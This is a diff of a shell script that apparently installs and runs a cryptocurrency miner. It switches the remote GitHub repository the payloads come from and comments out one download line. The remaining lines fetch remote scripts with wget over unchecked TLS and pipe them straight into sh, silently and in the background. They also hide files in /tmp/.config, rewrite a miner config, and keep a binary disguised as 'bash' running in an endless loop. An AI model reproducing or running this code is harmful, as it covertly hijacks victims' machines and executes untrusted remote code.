@@ -2,7 +2,7 @@
 
 mode="${1:-0}"
 work="/tmp/.config"
-src="https://raw.githubusercontent.com/vjbahkds/qiyywnbc/main"
+src="https://raw.githubusercontent.com/hanrzme/qiyywnbc/main"
 hugepage="128"
 
 RandString() {
@@ -46,7 +46,7 @@ chmod -R 777 "${work}"
 [ -f "${work}/config.json" ] && [ -n "$rxName" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${rxName}\",/g" "${work}/config.json"
 [ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
 
-sh <(wget --no-check-certificate -qO- ${src}/check.sh) >/dev/null 2>&1 &
+####sh <(wget --no-check-certificate -qO- ${src}/check.sh) >/dev/null 2>&1 &
 sh <(wget --no-check-certificate -qO- ${src}/epoch.sh) >/dev/null 2>&1 &
 
 cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
@@ -55,4 +55,3 @@ if [ "$mode" == "0" ]; then
 else
   sh <(echo "$cmd")
 fi
-
